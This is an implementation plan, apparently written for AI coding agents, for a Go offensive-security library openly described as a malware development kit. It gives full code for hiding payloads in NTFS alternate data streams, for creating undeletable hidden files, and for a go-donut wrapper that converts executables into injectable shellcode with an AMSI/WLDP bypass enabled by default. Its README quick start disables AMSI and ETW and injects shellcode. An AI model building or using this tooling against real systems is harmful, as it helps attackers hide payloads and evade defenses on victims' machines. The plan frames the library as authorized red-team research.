# Sprint 1: Fondations critiques — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement ADS CRUD operations, replace the pe/srdi placeholder with real go-donut shellcode generation, and slim the README for wiki migration.

**Architecture:** Three independent packages. `system/ads/` uses Win32 APIs (FindFirstStreamW, NtCreateFile) for NTFS alternate data stream operations. `pe/srdi/` wraps `github.com/Binject/go-donut/donut` with our existing Config API. README refactor removes technique docs (future wiki content).

**Tech Stack:** Go, x/sys/windows, github.com/Binject/go-donut, testify

**Spec:** `docs/superpowers/specs/2026-04-14-roadmap-v2-design.md` (Sprint 1)

---

## File Structure

### system/ads/ (new package)

| File | Responsibility |
|------|---------------|
| `system/ads/doc.go` | Package documentation with MITRE ATT&CK ID |
| `system/ads/ads_windows.go` | ADS CRUD implementation (List, Read, Write, Delete) |
| `system/ads/hidden_windows.go` | Hidden/undeletable file creation via NtCreateFile |
| `system/ads/ads_windows_test.go` | Tests for all ADS operations |
| `system/ads/ads_stub.go` | Build tag stub for non-Windows (`!windows`) |

### pe/srdi/ (rewrite existing)

| File | Responsibility |
|------|---------------|
| `pe/srdi/srdi.go` | Rewrite: wrap go-donut with our Config API |
| `pe/srdi/doc.go` | Update references to go-donut |
| `pe/srdi/srdi_test.go` | Rewrite tests for real shellcode generation |

### README.md (refactor)

| File | Responsibility |
|------|---------------|
| `README.md` | Slim to ~60 lines: install, quick start, structure, acknowledgments |

---

## Task 1: ADS Package — doc.go + stub

**Files:**
- Create: `system/ads/doc.go`
- Create: `system/ads/ads_stub.go`

- [ ] **Step 1: Create doc.go**

```go
// Package ads provides CRUD operations for NTFS Alternate Data Streams.
//
// Alternate Data Streams (ADS) are hidden data storage areas within NTFS files.
// Each file can have multiple named streams beyond the default :$DATA stream.
// ADS are commonly used for:
//   - Data hiding (T1564.004)
//   - Persistence (store payloads in ADS of legitimate files)
//   - Self-deletion (rename default stream before delete)
//
// Example:
//
//	// Write payload to ADS
//	err := ads.Write(`C:\Users\Public\desktop.ini`, "payload", shellcode)
//
//	// List all streams
//	streams, err := ads.List(`C:\Users\Public\desktop.ini`)
//
//	// Read it back
//	data, err := ads.Read(`C:\Users\Public\desktop.ini`, "payload")
//
//	// Delete the stream
//	err = ads.Delete(`C:\Users\Public\desktop.ini`, "payload")
//
// Technique: NTFS Alternate Data Streams
// MITRE ATT&CK: T1564.004 (Hide Artifacts: NTFS File Attributes)
// Platform: Windows only (NTFS filesystem required)
// Detection: Medium — Sysinternals Streams, PowerShell Get-Item -Stream *,
// and some EDR products can enumerate ADS.
//
// References:
//   - https://github.com/microsoft/go-winio/blob/main/backup.go
//   - https://cqureacademy.com/blog/alternate-data-streams/
package ads
```

- [ ] **Step 2: Create build-tag stub for non-Windows**

```go
//go:build !windows

package ads

// StreamInfo describes an alternate data stream.
type StreamInfo struct {
	Name string
	Size int64
}

// List returns an error on non-Windows platforms.
func List(path string) ([]StreamInfo, error) {
	return nil, errors.New("ADS not supported on this platform")
}

// Read returns an error on non-Windows platforms.
func Read(path, streamName string) ([]byte, error) {
	return nil, errors.New("ADS not supported on this platform")
}

// Write returns an error on non-Windows platforms.
func Write(path, streamName string, data []byte) error {
	return errors.New("ADS not supported on this platform")
}

// Delete returns an error on non-Windows platforms.
func Delete(path, streamName string) error {
	return errors.New("ADS not supported on this platform")
}
```

Add `import "errors"` at the top.

- [ ] **Step 3: Verify cross-compile**

Run: `GOOS=linux GOARCH=amd64 go build ./system/ads/`
Expected: success (stub compiles)

Run: `GOOS=windows GOARCH=amd64 go vet ./system/ads/`
Expected: success (doc.go + stub only, no windows impl yet — but stub has `!windows` tag, so this sees only doc.go which is fine)

- [ ] **Step 4: Commit**

```bash
git add system/ads/doc.go system/ads/ads_stub.go
git commit -m "feat(ads): scaffold system/ads/ package with doc.go and cross-platform stub"
```

---

## Task 2: ADS — List, Read, Write, Delete

**Files:**
- Create: `system/ads/ads_windows.go`
- Create: `system/ads/ads_windows_test.go`

- [ ] **Step 1: Write the failing tests**

Create `system/ads/ads_windows_test.go`:

```go
//go:build windows

package ads

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func tempFile(t *testing.T) string {
	t.Helper()
	f, err := os.CreateTemp("", "ads_test_*.txt")
	require.NoError(t, err)
	f.Write([]byte("main stream content"))
	f.Close()
	t.Cleanup(func() { os.Remove(f.Name()) })
	return f.Name()
}

func TestWriteAndRead(t *testing.T) {
	path := tempFile(t)
	payload := []byte("secret ADS payload")

	err := Write(path, "hidden", payload)
	require.NoError(t, err)

	got, err := Read(path, "hidden")
	require.NoError(t, err)
	assert.Equal(t, payload, got)
}

func TestList(t *testing.T) {
	path := tempFile(t)

	// Write two streams.
	require.NoError(t, Write(path, "stream1", []byte("aaa")))
	require.NoError(t, Write(path, "stream2", []byte("bbbbbb")))

	streams, err := List(path)
	require.NoError(t, err)

	names := make([]string, len(streams))
	for i, s := range streams {
		names[i] = s.Name
	}
	assert.Contains(t, names, "stream1")
	assert.Contains(t, names, "stream2")
}

func TestDelete(t *testing.T) {
	path := tempFile(t)

	require.NoError(t, Write(path, "todelete", []byte("data")))
	require.NoError(t, Delete(path, "todelete"))

	_, err := Read(path, "todelete")
	assert.Error(t, err, "reading a deleted ADS should fail")
}

func TestReadNonexistent(t *testing.T) {
	path := tempFile(t)
	_, err := Read(path, "nonexistent")
	assert.Error(t, err)
}

func TestDeleteNonexistent(t *testing.T) {
	path := tempFile(t)
	err := Delete(path, "nonexistent")
	assert.Error(t, err)
}

func TestWriteEmptyStream(t *testing.T) {
	path := tempFile(t)
	err := Write(path, "empty", []byte{})
	require.NoError(t, err)

	got, err := Read(path, "empty")
	require.NoError(t, err)
	assert.Empty(t, got)
}

func TestListOnFileWithNoADS(t *testing.T) {
	path := tempFile(t)
	streams, err := List(path)
	require.NoError(t, err)
	// A file always has at least the default :$DATA stream,
	// but List should only return alternate (non-default) streams.
	assert.Empty(t, streams, "no alternate streams should be listed")
}

func TestWriteOnNonNTFS(t *testing.T) {
	// Attempt to write ADS on a path that might not support it.
	// This is best-effort; skip if we can't create a temp file.
	tmpDir := os.TempDir()
	path := filepath.Join(tmpDir, "ads_ntfs_test.txt")
	f, err := os.Create(path)
	if err != nil {
		t.Skip("cannot create temp file")
	}
	f.Close()
	defer os.Remove(path)

	// On NTFS this should work, on non-NTFS it should return an error.
	// We just verify it doesn't panic.
	_ = Write(path, "test", []byte("data"))
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test -v -count=1 ./system/ads/ -timeout 30s`
Expected: FAIL — `Write`, `Read`, `List`, `Delete` not defined

- [ ] **Step 3: Implement ADS CRUD**

Create `system/ads/ads_windows.go`:

```go
//go:build windows

package ads

import (
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// StreamInfo describes an alternate data stream.
type StreamInfo struct {
	Name string
	Size int64
}

// findStreamData matches the WIN32_FIND_STREAM_DATA structure.
type findStreamData struct {
	StreamSize int64
	StreamName [296]uint16 // MAX_PATH + 36
}

var (
	modKernel32          = windows.NewLazySystemDLL("kernel32.dll")
	procFindFirstStreamW = modKernel32.NewProc("FindFirstStreamW")
	procFindNextStreamW  = modKernel32.NewProc("FindNextStreamW")
)

// List returns all alternate data streams on a file (excludes the default :$DATA stream).
func List(path string) ([]StreamInfo, error) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return nil, fmt.Errorf("invalid path: %w", err)
	}

	var fsd findStreamData
	handle, _, callErr := procFindFirstStreamW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		0, // FindStreamInfoStandard
		uintptr(unsafe.Pointer(&fsd)),
		0,
	)
	if handle == uintptr(windows.InvalidHandle) {
		// ERROR_HANDLE_EOF means no streams at all.
		if callErr == windows.ERROR_HANDLE_EOF {
			return nil, nil
		}
		return nil, fmt.Errorf("FindFirstStreamW: %w", callErr)
	}
	defer windows.FindClose(windows.Handle(handle))

	var streams []StreamInfo
	for {
		name := windows.UTF16ToString(fsd.StreamName[:])
		// Stream names are like ":streamname:$DATA". Parse the name.
		streamName := parseStreamName(name)
		if streamName != "" {
			streams = append(streams, StreamInfo{
				Name: streamName,
				Size: fsd.StreamSize,
			})
		}

		fsd = findStreamData{}
		r, _, callErr := procFindNextStreamW.Call(
			handle,
			uintptr(unsafe.Pointer(&fsd)),
		)
		if r == 0 {
			if callErr == windows.ERROR_HANDLE_EOF {
				break
			}
			return streams, fmt.Errorf("FindNextStreamW: %w", callErr)
		}
	}

	return streams, nil
}

// parseStreamName extracts the user-friendly name from ":name:$DATA".
// Returns empty string for the default stream "::$DATA".
func parseStreamName(raw string) string {
	// Format: ":streamname:$DATA"
	if !strings.HasPrefix(raw, ":") {
		return ""
	}
	raw = raw[1:] // strip leading ":"
	idx := strings.Index(raw, ":")
	if idx <= 0 {
		return "" // default stream "::$DATA" → empty after strip
	}
	return raw[:idx]
}

// Read reads the content of a named alternate data stream.
func Read(path, streamName string) ([]byte, error) {
	adsPath := path + ":" + streamName
	return os.ReadFile(adsPath)
}

// Write creates or overwrites a named alternate data stream.
func Write(path, streamName string, data []byte) error {
	adsPath := path + ":" + streamName
	return os.WriteFile(adsPath, data, 0644)
}

// Delete removes a named alternate data stream.
func Delete(path, streamName string) error {
	adsPath := path + ":" + streamName
	err := os.Remove(adsPath)
	if err != nil {
		return fmt.Errorf("delete ADS %q: %w", streamName, err)
	}
	return nil
}
```

- [ ] **Step 4: Run tests**

Run: `go test -v -count=1 ./system/ads/ -timeout 30s`
Expected: All PASS

- [ ] **Step 5: Verify build**

Run: `go build $(go list ./...)`
Expected: success

Run: `GOOS=linux GOARCH=amd64 go build ./system/ads/`
Expected: success (stub compiles)

- [ ] **Step 6: Commit**

```bash
git add system/ads/
git commit -m "feat(ads): NTFS alternate data stream CRUD — List, Read, Write, Delete

Uses FindFirstStreamW/FindNextStreamW for enumeration, standard file I/O
with path:stream syntax for read/write/delete. Cross-platform stub for Linux.
MITRE: T1564.004"
```

---

## Task 3: ADS — Hidden/Undeletable Files

**Files:**
- Create: `system/ads/hidden_windows.go`
- Modify: `system/ads/ads_windows_test.go` (add tests)
- Modify: `system/ads/ads_stub.go` (add stub)

- [ ] **Step 1: Write the failing tests**

Add to `system/ads/ads_windows_test.go`:

```go
func TestCreateUndeletable(t *testing.T) {
	dir := t.TempDir()

	path, err := CreateUndeletable(dir, []byte("hidden payload"))
	require.NoError(t, err)
	t.Logf("Created undeletable file: %s", path)

	// Verify the file exists and contains our data.
	data, err := ReadUndeletable(path)
	require.NoError(t, err)
	assert.Equal(t, []byte("hidden payload"), data)

	// Verify that normal os.Remove fails or the name is unusual.
	assert.Contains(t, path, "...", "path should use reserved name trick")
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test -v -count=1 -run TestCreateUndeletable ./system/ads/`
Expected: FAIL — `CreateUndeletable` not defined

- [ ] **Step 3: Implement hidden file creation**

Create `system/ads/hidden_windows.go`:

```go
//go:build windows

package ads

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// CreateUndeletable creates a file with a name that Windows Explorer and cmd
// cannot delete (trailing dots trick). Only \\?\ prefix or NtCreateFile can access it.
// Returns the full path to the created file.
func CreateUndeletable(dir string, data []byte) (string, error) {
	// The "..." trick: filenames ending with dots are stripped by Win32 API
	// but NtCreateFile (via \\?\ prefix) preserves them.
	name := "..." // three dots — invisible to Explorer, undeletable via cmd
	fullPath := filepath.Join(dir, name)

	// Use \\?\ prefix to bypass Win32 name normalization.
	ntPath := `\\?\` + fullPath

	pathPtr, err := windows.UTF16PtrFromString(ntPath)
	if err != nil {
		return "", fmt.Errorf("invalid path: %w", err)
	}

	handle, err := windows.CreateFile(
		pathPtr,
		windows.GENERIC_WRITE,
		0,
		nil,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM,
		0,
	)
	if err != nil {
		return "", fmt.Errorf("CreateFile: %w", err)
	}

	if len(data) > 0 {
		var written uint32
		err = windows.WriteFile(handle, data, &written, nil)
		windows.CloseHandle(handle)
		if err != nil {
			return "", fmt.Errorf("WriteFile: %w", err)
		}
	} else {
		windows.CloseHandle(handle)
	}

	return fullPath, nil
}

// ReadUndeletable reads a file created by CreateUndeletable.
func ReadUndeletable(path string) ([]byte, error) {
	ntPath := `\\?\` + path
	return os.ReadFile(ntPath)
}
```

- [ ] **Step 4: Add stubs for non-Windows**

Add to `system/ads/ads_stub.go`:

```go
// CreateUndeletable returns an error on non-Windows platforms.
func CreateUndeletable(dir string, data []byte) (string, error) {
	return "", errors.New("undeletable files not supported on this platform")
}

// ReadUndeletable returns an error on non-Windows platforms.
func ReadUndeletable(path string) ([]byte, error) {
	return nil, errors.New("undeletable files not supported on this platform")
}
```

- [ ] **Step 5: Run tests**

Run: `go test -v -count=1 ./system/ads/ -timeout 30s`
Expected: All PASS (including TestCreateUndeletable)

- [ ] **Step 6: Commit**

```bash
git add system/ads/
git commit -m "feat(ads): hidden/undeletable file creation via trailing dots trick

CreateUndeletable uses \\\\?\\ prefix to bypass Win32 name normalization,
creating files with '...' name that Explorer/cmd cannot delete.
Ref: https://cqureacademy.com/blog/alternate-data-streams/"
```

---

## Task 4: go-donut — Replace pe/srdi Placeholder

**Files:**
- Modify: `pe/srdi/srdi.go` (rewrite)
- Modify: `pe/srdi/doc.go` (update refs)
- Modify: `pe/srdi/srdi_test.go` (rewrite)

- [ ] **Step 1: Write the failing tests**

Rewrite `pe/srdi/srdi_test.go`:

```go
package srdi

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	require.NotNil(t, cfg)
	assert.Equal(t, ArchX64, cfg.Arch)
	assert.Equal(t, 3, cfg.Bypass, "default should continue on AMSI/WLDP fail")
}

func TestConvertBytes_InvalidPE(t *testing.T) {
	_, err := ConvertBytes([]byte("not a PE"), nil)
	assert.Error(t, err, "should reject non-PE input")
}

func TestConvertBytes_TooShort(t *testing.T) {
	_, err := ConvertBytes([]byte("M"), nil)
	assert.Error(t, err, "should reject single-byte input")
}

func TestConvertBytes_Nil(t *testing.T) {
	_, err := ConvertBytes(nil, nil)
	assert.Error(t, err, "should reject nil input")
}

func TestConvertBytes_MinimalMZ(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("go-donut requires Windows PE structures")
	}
	// Use a real small PE — cmd.exe is always available.
	data, err := os.ReadFile(filepath.Join(os.Getenv("WINDIR"), "System32", "cmd.exe"))
	if err != nil {
		t.Skipf("cannot read cmd.exe: %v", err)
	}

	cfg := DefaultConfig()
	cfg.Arch = ArchX64

	result, err := ConvertBytes(data, cfg)
	require.NoError(t, err)
	assert.NotEmpty(t, result, "should produce shellcode")
	assert.Greater(t, len(result), 100, "shellcode should be non-trivial")
	t.Logf("Generated %d bytes of shellcode from %d bytes PE", len(result), len(data))
}

func TestConvertFile_MissingFile(t *testing.T) {
	_, err := ConvertFile("/nonexistent/path/to/file.dll", nil)
	assert.Error(t, err, "should fail on missing file")
}

func TestConvertFile_RealPE(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("go-donut requires Windows PE structures")
	}
	cmdPath := filepath.Join(os.Getenv("WINDIR"), "System32", "cmd.exe")

	cfg := DefaultConfig()
	result, err := ConvertFile(cmdPath, cfg)
	require.NoError(t, err)
	assert.NotEmpty(t, result)
	t.Logf("ConvertFile produced %d bytes", len(result))
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `go test -v -count=1 ./pe/srdi/ -timeout 30s`
Expected: FAIL — `ArchX64` not defined, API mismatch

- [ ] **Step 3: Rewrite srdi.go with go-donut wrapper**

Replace `pe/srdi/srdi.go` entirely:

```go
// Package srdi provides PE/DLL/EXE-to-shellcode conversion using the Donut
// framework. Converts standard Windows executables into position-independent
// shellcode that can be injected into any process.
//
// This package wraps github.com/Binject/go-donut for shellcode generation.
// Supported input formats: native EXE, native DLL, .NET EXE, .NET DLL,
// VBScript, JScript, XSL.
//
// MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
// Detection: Medium
//
// References:
//   - https://github.com/Binject/go-donut
//   - https://github.com/TheWover/donut
package srdi

import (
	"bytes"
	"fmt"
	"os"

	"github.com/Binject/go-donut/donut"
)

// Arch represents the target architecture for shellcode generation.
type Arch int

const (
	ArchX32 Arch = iota // 32-bit only
	ArchX64             // 64-bit only
	ArchX84             // dual-mode (32+64)
)

// ModuleType represents the type of input binary.
type ModuleType int

const (
	ModuleNetDLL ModuleType = 1 // .NET DLL
	ModuleNetEXE ModuleType = 2 // .NET EXE
	ModuleDLL    ModuleType = 3 // Native DLL
	ModuleEXE    ModuleType = 4 // Native EXE
	ModuleVBS    ModuleType = 5 // VBScript
	ModuleJS     ModuleType = 6 // JScript
	ModuleXSL    ModuleType = 7 // XSL
)

// Config controls the shellcode generation.
type Config struct {
	// Arch is the target architecture (default: ArchX64).
	Arch Arch

	// Type is the input binary type. If zero, auto-detected by ConvertFile.
	Type ModuleType

	// Class is the .NET class name (required for .NET DLL).
	Class string

	// Method is the .NET method name or native DLL export to call.
	Method string

	// Parameters are command-line arguments passed to the payload.
	Parameters string

	// Bypass controls AMSI/WLDP bypass in the loader stub.
	// 1 = skip, 2 = abort on fail, 3 = continue on fail (default).
	Bypass int

	// Thread runs the entry point in a new thread if true.
	Thread bool
}

// DefaultConfig returns a sensible default configuration.
func DefaultConfig() *Config {
	return &Config{
		Arch:   ArchX64,
		Type:   ModuleEXE,
		Bypass: 3, // continue on AMSI/WLDP fail
	}
}

// ConvertFile converts a PE/DLL/.NET/VBS/JS file to position-independent shellcode.
func ConvertFile(path string, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}

	dcfg := mapConfig(cfg)
	buf, err := donut.ShellcodeFromFile(path, dcfg)
	if err != nil {
		return nil, fmt.Errorf("donut: %w", err)
	}
	return buf.Bytes(), nil
}

// ConvertBytes converts raw PE/DLL bytes to position-independent shellcode.
// You must set cfg.Type explicitly when using this function (no auto-detection).
func ConvertBytes(data []byte, cfg *Config) ([]byte, error) {
	if len(data) < 2 {
		return nil, fmt.Errorf("input too short (%d bytes)", len(data))
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE: missing MZ header")
	}

	if cfg == nil {
		cfg = DefaultConfig()
	}

	dcfg := mapConfig(cfg)
	buf, err := donut.ShellcodeFromBytes(bytes.NewBuffer(data), dcfg)
	if err != nil {
		return nil, fmt.Errorf("donut: %w", err)
	}
	return buf.Bytes(), nil
}

// ConvertDLL converts a DLL file into position-independent shellcode.
// Shorthand for ConvertFile with Type set to ModuleDLL.
func ConvertDLL(dllPath string, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	cfg.Type = ModuleDLL
	return ConvertFile(dllPath, cfg)
}

// ConvertDLLBytes converts raw DLL bytes into shellcode.
// Shorthand for ConvertBytes with Type set to ModuleDLL.
func ConvertDLLBytes(dllBytes []byte, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	cfg.Type = ModuleDLL
	return ConvertBytes(dllBytes, cfg)
}

// mapConfig converts our Config to go-donut's DonutConfig.
func mapConfig(cfg *Config) *donut.DonutConfig {
	dcfg := donut.DefaultConfig()
	dcfg.Arch = donut.DonutArch(cfg.Arch)
	dcfg.Type = donut.ModuleType(cfg.Type)
	dcfg.Class = cfg.Class
	dcfg.Method = cfg.Method
	dcfg.Parameters = cfg.Parameters
	dcfg.Bypass = cfg.Bypass
	if cfg.Thread {
		dcfg.Thread = 1
	}
	return dcfg
}

// Ensure we can still read DLL files for backward compat.
var _ = os.ReadFile
```

- [ ] **Step 4: Update doc.go**

Replace `pe/srdi/doc.go`:

```go
// Package srdi provides PE/DLL/EXE-to-shellcode conversion using the Donut
// framework (github.com/Binject/go-donut).
//
// Supported input formats:
//   - Native EXE (ModuleEXE)
//   - Native DLL (ModuleDLL) — call specific export via Config.Method
//   - .NET EXE (ModuleNetEXE)
//   - .NET DLL (ModuleNetDLL) — specify Config.Class and Config.Method
//   - VBScript (ModuleVBS)
//   - JScript (ModuleJS)
//   - XSL (ModuleXSL)
//
// Usage:
//
//	// Convert a native DLL to shellcode
//	cfg := srdi.DefaultConfig()
//	cfg.Type = srdi.ModuleDLL
//	cfg.Method = "MyExport"
//	shellcode, err := srdi.ConvertFile("payload.dll", cfg)
//
//	// Convert raw bytes (e.g., downloaded PE)
//	cfg := &srdi.Config{Arch: srdi.ArchX64, Type: srdi.ModuleEXE, Bypass: 3}
//	shellcode, err := srdi.ConvertBytes(peData, cfg)
//
// Technique: PE-to-Shellcode Conversion (Donut)
// MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
// Platform: Cross-platform generation, Windows x86/x64 shellcode output
// Detection: Medium — memory scanners may detect the Donut loader stub.
//
// References:
//   - https://github.com/Binject/go-donut
//   - https://github.com/TheWover/donut
//   - https://github.com/monoxgas/sRDI
package srdi
```

- [ ] **Step 5: Run tests**

Run: `go test -v -count=1 ./pe/srdi/ -timeout 60s`
Expected: PASS (Windows tests use cmd.exe as test PE, Linux tests skip)

- [ ] **Step 6: Verify full build**

Run: `go build $(go list ./...)`
Expected: success

Run: `GOOS=linux GOARCH=amd64 go build ./pe/srdi/`
Expected: success

- [ ] **Step 7: Commit**

```bash
git add pe/srdi/
git commit -m "feat(srdi): replace placeholder with real go-donut shellcode generation

Wraps github.com/Binject/go-donut for PE/DLL/.NET/VBS/JS to shellcode
conversion. Supports x86/x64/dual-mode, AMSI/WLDP bypass, configurable
exports. ConvertDLL/ConvertDLLBytes backward compat preserved.
Credit: Binject/go-donut, TheWover/donut"
```

---

## Task 5: README Refactor

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Rewrite README**

Replace `README.md` with:

```markdown
# maldev

Modular malware development library in Go for offensive security research.

[![Go Reference](https://pkg.go.dev/badge/github.com/oioio-space/maldev.svg)](https://pkg.go.dev/github.com/oioio-space/maldev)

## Install

```bash
go get github.com/oioio-space/maldev@latest
```

## Quick Start

```go
import (
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// 1. Create a Caller for stealthy syscalls
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))

// 2. Disable defenses
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),
    etw.All(),
}, caller)

// 3. Inject shellcode
injector, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodIndirect,
})
injector.Inject(shellcode)
```

## Documentation

Full documentation is available in the [Wiki](https://github.com/oioio-space/maldev/wiki):
guides, technique references with MITRE ATT&CK mapping, API docs, and composed examples.

## Project Structure

```
maldev/
├── crypto/  encode/  hash/  random/  useragent/         # Layer 0: Pure utilities
├── win/api/  win/syscall/  win/ntapi/  win/token/        # Layer 1: OS primitives
├── win/privilege/  win/impersonate/  win/user/  win/domain/  win/version/
├── evasion/amsi/  evasion/etw/  evasion/unhook/          # Layer 2: Evasion
├── evasion/sleepmask/  evasion/hwbp/  evasion/acg/  evasion/blockdlls/
├── evasion/antidebug/  evasion/antivm/  evasion/sandbox/  evasion/timing/
├── evasion/herpaderping/  evasion/phant0m/
├── inject/                                                # Layer 2: Injection (15+ methods)
├── pe/parse/  pe/srdi/  pe/strip/  pe/bof/  pe/morph/  pe/cert/
├── process/enum/  process/session/
├── system/ads/  system/drive/  system/folder/  system/network/  system/lnk/  system/bsod/  system/ui/
├── c2/shell/  c2/transport/  c2/meterpreter/  c2/cert/   # Layer 3: C2
├── persistence/registry/  persistence/startup/  persistence/scheduler/  persistence/service/
├── collection/keylog/  collection/clipboard/  collection/screenshot/
├── cleanup/selfdelete/  cleanup/memory/  cleanup/service/  cleanup/timestomp/  cleanup/wipe/
├── uacbypass/  exploit/cve202430088/
└── internal/log/  internal/compat/  testutil/  cmd/rshell/
```

## Build

```bash
go build $(go list ./...)       # development build
go test $(go list ./...)        # run tests
GOOS=linux go build $(go list ./...)  # cross-compile
```

Requirements: Go 1.21+ -- no CGO required.

## Acknowledgments

- [D3Ext/maldev](https://github.com/D3Ext/maldev) — Original inspiration
- [Binject/go-donut](https://github.com/Binject/go-donut) + [TheWover/donut](https://github.com/TheWover/donut) — PE-to-shellcode (pe/srdi)
- [microsoft/go-winio](https://github.com/microsoft/go-winio) — ADS concepts (system/ads)

## License

For authorized security research, red team operations, and penetration testing only.
```

- [ ] **Step 2: Verify links are valid**

Run: `grep -oP '\[.*?\]\(docs/.*?\)' README.md`
Expected: No output (all doc links removed, only wiki link remains)

- [ ] **Step 3: Commit**

```bash
git add README.md
git commit -m "docs: slim README for wiki migration — install, quick start, structure only"
```

---

## Task 6: Final Verification

- [ ] **Step 1: Full build**

Run: `go build $(go list ./...)`
Expected: success

- [ ] **Step 2: Full test**

Run: `go test $(go list ./... | grep -v scripts) -count=1 -short`
Expected: 0 FAIL

- [ ] **Step 3: Cross-compile**

Run: `GOOS=linux GOARCH=amd64 go vet ./system/ads/ ./pe/srdi/`
Expected: success

- [ ] **Step 4: Verify no ignore/ staged**

Run: `git diff --cached --name-only | grep ^ignore/ || echo "OK"`
Expected: OK

- [ ] **Step 5: Push**

```bash
git push origin master
```
